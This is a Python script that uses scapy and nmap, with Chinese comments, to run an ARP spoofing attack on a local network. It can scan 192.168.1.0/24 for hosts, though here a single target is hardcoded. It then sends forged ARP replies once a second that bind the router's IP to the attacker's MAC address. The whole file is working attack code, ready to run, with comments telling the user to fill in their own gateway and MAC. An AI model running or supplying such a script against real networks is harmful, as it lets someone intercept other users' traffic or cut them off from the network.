
import sys
import time
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import nmap
import os



def get_ip_mac_in_network(network):
    try:
        result = {}
        nm = nmap.PortScanner()
        nm.scan(hosts=network, arguments="-sn")
        for host in nm.all_hosts():
            if 'mac' in nm[host]['addresses']:
                result[host] = nm[host]['addresses']['mac']
        return result
    except Exception as e:
        print(f"没扫到: {e}")
        return {}
def is_gateway_reachable(gateway_ip):
    response = os.system(f"ping -c 1 {gateway_ip}")
    return response == 0

def send_arp(devices, router_ip, mine_mac):
    try:
        for target_ip, target_mac in devices.items():
            if target_ip == router_ip:
                print(f"跳过网关 {router_ip}，")
                continue
            print(f"ARP_TO {target_ip} ({target_mac})")
            arp_response = ARP(
                op=2,
                psrc=router_ip,
                pdst=target_ip,
                hwsrc=mine_mac,
                hwdst=target_mac
            )
            ether_response = Ether(dst=target_mac) / arp_response
            sendp(ether_response, verbose=False)
    except Exception as e:
        print(f"ARP_WRONG: {e}")
    
def main():
    network = "192.168.1.0/24"##不用改
    router_ip = "192.168.1.1" ##看你的网关
    mine_mac = "40:A5:EF:24:FD:63"##看你的mac地址

    print(f"{router_ip} 是否在线...")
    if not is_gateway_reachable(router_ip):
        print(f"网关 {router_ip} 不在线")
        return

    print("SCANNING...")
    # devices = get_ip_mac_in_network(network)
    devices = {
        "192.168.1.68": "D4:84:09:83:8B:AD"
    }
    if not devices:
        print("没设备")
        return

    print(f"有 {len(devices)} 个设备")
    for ip, mac in devices.items():
        print(f"设备: {ip} -> {mac}")

    print("\nARP...")
    try:
        while True:
            send_arp(devices, router_ip, mine_mac)
            time.sleep(1)
    except Exception as e:
        print(f"NO: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nSTOP")
    except Exception as e:
        print(f"NO: {e}")
